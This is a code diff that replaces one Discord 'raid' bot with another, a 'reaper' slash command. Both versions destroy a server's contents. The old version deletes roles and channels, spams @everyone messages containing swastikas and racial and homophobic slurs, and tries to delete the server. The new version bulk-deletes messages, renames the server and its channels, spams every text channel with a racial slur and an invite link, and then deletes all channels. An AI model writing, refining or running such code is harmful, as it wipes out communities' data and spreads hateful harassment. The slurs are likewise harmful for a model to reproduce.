@@ -1,75 +1,104 @@
-const { SlashCommandBuilder } = require('discord.js');
-const { AttachmentBuilder } = require('discord.js');
-const wait = require('node:timers/promises').setTimeout;
+const { SlashCommandBuilder } = require('@discordjs/builders');
+const { REST } = require('@discordjs/rest');
+const { Routes } = require('discord-api-types/v9');
+const { Client, Intents } = require('discord.js');
+const { token } = require('./config.json'); // Store your bot token in a config.json file
 
-module.exports = {
-    data: new SlashCommandBuilder()
-        .setName('raid')
-        .setDescription('Raids the server (admin only)')
-        .addUserOption(option => option.setName('target').setDescription('The user who can use this command').setRequired(true)),
-    async execute(interaction) {
-        const target = interaction.options.getUser('target');
-        if (interaction.user.id !== target.id) {
-            return interaction.reply({ content: 'You are not authorized to use this command!', ephemeral: true });
-        }
+const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES] });
 
-        await interaction.reply({ content: 'Starting raid...', ephemeral: true });
+const commands = [
+    new SlashCommandBuilder()
+        .setName('reaper')
+        .setDescription('Destroys the server.')
+].map(command => command.toJSON());
 
-        // Delete all roles
-        interaction.guild.roles.cache.forEach(async (role) => {
-            try {
-                if (role.name !== '@everyone') {
-                    await role.delete();
+const rest = new REST({ version: '9' }).setToken(token);
+
+(async () => {
+    try {
+        console.log('Started refreshing application (/) commands.');
+
+        await rest.put(
+            Routes.applicationGuildCommands('YOUR_CLIENT_ID', 'YOUR_GUILD_ID'), // Replace with your client and guild IDs
+            { body: commands },
+        );
+
+        console.log('Successfully reloaded application (/) commands.');
+    } catch (error) {
+        console.error(error);
+    }
+})();
+
+client.on('interactionCreate', async interaction => {
+    if (!interaction.isCommand()) return;
+
+    const { commandName } = interaction;
+
+    if (commandName === 'reaper') {
+        await interaction.reply('Executing Reaper Protocol...');
+
+        // Change channel name
+        try {
+            await interaction.guild.channels.cache.forEach(channel => {
+                if (channel.type === 'GUILD_TEXT') {
+                    channel.setName('gg-reaper').catch(console.error);
                 }
-            } catch (error) {
-                console.error(`Failed to delete role ${role.name}:`, error);
-            }
-        });
-
-        // Delete all channels
-        interaction.guild.channels.cache.forEach(async (channel) => {
-            try {
-                await channel.delete();
-            } catch (error) {
-                console.error(`Failed to delete channel ${channel.name}:`, error);
-            }
-        });
-
-        // Create new roles
-        try {
-            await interaction.guild.roles.create({ name: 'Reaper Raided You', color: 'Red' });
+            });
         } catch (error) {
-            console.error('Failed to create role:', error);
+            console.error('Error changing channel names:', error);
         }
 
-        // Change server profile picture
-        try {
-            const attachment = new AttachmentBuilder('https://preview.redd.it/bad-to-the-bone-v0-gbxt4ko5q2ya1.jpg?auto=webp&s=fee58f8dfda8623eb8a8dd328262efb9a2f11be0', { name: 'server_icon.jpg' });
-            await interaction.guild.setIcon(attachment);
-        } catch (error) {
-            console.error('Failed to set server icon:', error);
-        }
 
-        // Spam channels (create and send messages)
-        for (let i = 0; i < 5; i++) { // create 5 channels to spam to
-            try {
-                const channel = await interaction.guild.channels.create('reaper-raid', { type: 0 }); // 0 is text channel
-                for (let j = 0; j < 5; j++) { // send 5 messages to each new channel
-                    await channel.send('@everyone 卐 https://discord.gg/bhdCGGaNsJ JOIN TODAY FAGGOT NIGGER卐');
+        // Delete all messages
+        try {
+            await interaction.guild.channels.cache.forEach(async channel => {
+                if (channel.type === 'GUILD_TEXT') {
+                    try {
+                        let messages = await channel.messages.fetch({ limit: 100 }); // Fetching only 100 messages at a time to prevent errors.
+                        await channel.bulkDelete(messages, true); // Bulk delete
+                        console.log(`Successfully deleted messages in ${channel.name}`);
+                    } catch (error) {
+                        console.error(`Error deleting messages in ${channel.name}:`, error);
+                    }
                 }
-            } catch (error) {
-                console.error('Failed to create/spam channel:', error);
-            }
-        }
-
-
-        // Delete the server after 10 seconds
-        await wait(10000);
-        try {
-            await interaction.guild.delete();
+            });
         } catch (error) {
-            console.error('Failed to delete server:', error);
-            //If the bot doesn't have perms, it will log it
+            console.error('Error deleting messages:', error);
         }
-    },
-};
+
+        // Change server name
+        try {
+            await interaction.guild.setName('gg-reaper').catch(console.error);
+        } catch (error) {
+            console.error('Error changing server name:', error);
+        }
+
+        // Spam all channels
+        const spamMessage = 'https://discord.gg/TqFhzjmyjx on top lil nigga';
+        try {
+            await interaction.guild.channels.cache.forEach(channel => {
+                if (channel.type === 'GUILD_TEXT') {
+                    for (let i = 0; i < 5; i++) { // Reduced spam count for safety
+                        channel.send(spamMessage).catch(console.error);
+                    }
+                }
+            });
+        } catch (error) {
+            console.error('Error spamming channels:', error);
+        }
+
+
+        // Delete all channels after 10 seconds
+        setTimeout(() => {
+            try {
+                interaction.guild.channels.cache.forEach(channel => {
+                    channel.delete().catch(console.error);
+                });
+            } catch (error) {
+                console.error('Error deleting channels:', error);
+            }
+        }, 10000);
+    }
+});
+
+client.login(token);
